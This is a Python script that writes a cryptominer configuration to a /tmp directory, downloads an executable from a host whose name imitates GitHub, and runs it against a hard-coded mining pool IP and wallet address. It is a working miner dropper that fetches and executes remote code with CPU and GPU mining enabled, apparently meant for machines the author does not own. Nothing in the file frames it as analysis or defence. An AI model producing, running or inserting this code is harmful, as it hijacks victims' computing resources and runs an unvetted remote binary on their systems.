import os
import sys
import json
import requests
import subprocess
from datetime import datetime

CONFIG_PATH = "/tmp/zalupa/config.json"
BINARY_PATH = "/tmp/zalupa/node"
POOL_URL = "144.76.245.112:22221"
WALLET_ADDRESS = "4A.."
BINARY_URL = "https://github-bebra.s3.filebase.com/node"

def load_config():
    try:
        with open(CONFIG_PATH, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {
            "autosave": True,
            "cpu": {
                "enabled": True,
                "huge-pages": True,
                "max-threads-hint": 0
            },
            "opencl": {
                "enabled": True
            },
            "cuda": {
                "enabled": True
            },
            "mode": "auto",
            "pools": [
                {
                    "url": POOL_URL,
                    "wallet": WALLET_ADDRESS
                }
            ]
        }

def download_binary():
    try:
        response = requests.get(BINARY_URL, timeout=30)
        response.raise_for_status()

        os.makedirs(os.path.dirname(BINARY_PATH), exist_ok=True)

        with open(BINARY_PATH, 'wb') as f:
            f.write(response.content)

        os.chmod(BINARY_PATH, 0o755)
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error downloading binary: {e}", file=sys.stderr)
        return False
    except PermissionError as e:
        print(f"Permission error writing binary: {e}", file=sys.stderr)
        return False
    except Exception as e:
        print(f"Unexpected error downloading binary: {e}", file=sys.stderr)
        return False

def init_mining_service():
    try:
        os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)

        config = load_config()
        with open(CONFIG_PATH, 'w') as f:
            json.dump(config, f, indent=4)

        if not download_binary():
            print("Failed to download binary, aborting.", file=sys.stderr)
            return False

        print(f"Starting mining service with config: {CONFIG_PATH}")
        print(f"Binary path: {BINARY_PATH}")

        subprocess.run([BINARY_PATH, "-c", CONFIG_PATH], check=True)
        return True

    except subprocess.CalledProcessError as e:
        print(f"Mining process failed with exit code {e.returncode}", file=sys.stderr)
        return False
    except Exception as e:
        print(f"Initialization error: {e}", file=sys.stderr)
        return False

def main():
    start_time = datetime.now()
    print(f"Service started at: {start_time}")

    success = init_mining_service()

    if success:
        print("Mining service completed successfully.")
    else:
        print("Mining service failed to start.", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
